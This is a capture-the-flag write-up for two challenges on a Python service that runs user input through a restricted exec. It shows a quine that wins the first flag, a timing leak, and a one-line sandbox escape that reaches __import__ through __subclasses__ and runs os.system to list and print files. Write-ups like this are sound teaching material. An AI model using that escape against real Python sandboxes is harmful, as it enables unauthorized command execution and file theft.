# Quineserv (64 pts) & Return to Quineserv (99 pts)

These are two misc-category challenges in one service, solved 20 and 5 times respectively.

>Electric Frankenstein wrote this service. I think it is going a little too far into GÃ¶del Escher Bach if you ask me. But at least it tells you when you accidentally infect the laboratory with a virus.
>challenges.openctf.cat:9006

When connecting to the service we are greeted with a prompt. Let's throw some inputs at it and see what's up:

```python
$ nc challenges.openctf.cat 9006
# 
nothing is apparently a quine, but we don't want this to be that easy.
# ls
Traceback (most recent call last):
  File "./quineserv.py", line 45, in <module>
    exec(inp, {'__builtins__': {'print':mixprint, 'repr':repr, 'flag':''}}, {})
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
# print('foo')
Quines win. You lose.
```

So it's a Python service. Apparently it `exec`'s our input with hardly any builtins. But our input must be a quine.
Google to the rescue. We'll need one that's compatible with the available builtins:

```python
$ nc challenges.openctf.cat 9006
# print((lambda s:s%s)('print((lambda s:s%%s)(%r))'))
You win level 1. flag{If only one of us could find the time. adeb4289b6a555}
print((lambda s:s%s)('print((lambda s:s%%s)(%r))'))
```

Yay! **Quineserv** done. But shortly after, **Return to Quineserv** pops up:
>It behooves me to ask you to return to quineserv. I'm pretty sure you didn't actually take from it what was once Electric Frankenstein's. I believe that they thought themselves better than you in placing two flags in the same challenge. One to make you think that you had won, and the other to mock your lack of skill. For the first will become worthless among the fierce competition of hackers, the second, not so much.

The service remains the same. We recall that it executed our input. But we aren't shown the output unless it's a quine. But maybe that's alright:

```bash
$ time (echo '[x for x in [0]*10000000]' | nc challenges.openctf.cat 9006)
real	0m0,712s
$ time (echo '[x for x in [0]*50000000]' | nc challenges.openctf.cat 9006)
real	0m2,609s
```

We're able to leak information. So we could set up something to leak the output of our commands spectacularly slowly. Or we can set up a local testing environment that runs Python3 in the same `exec` context and hope we get it right... Sounds like a lot of work.

But actually, it's gonna be super easy. Barely an inconvenience.

 I had a look in the toolbox. Can we find `__import__` and run a shell to print to stdout directly, before failing the quine check? Yes we can.

```python
$ nc challenges.openctf.cat 9006
# [t for t in ().__class__.__bases__[0].__subclasses__() if 'ModuleSpec' in t.__name__][0].__repr__.__globals__['__import__']('os').system('ls;cat *')

And there it is. Our sweet flag.
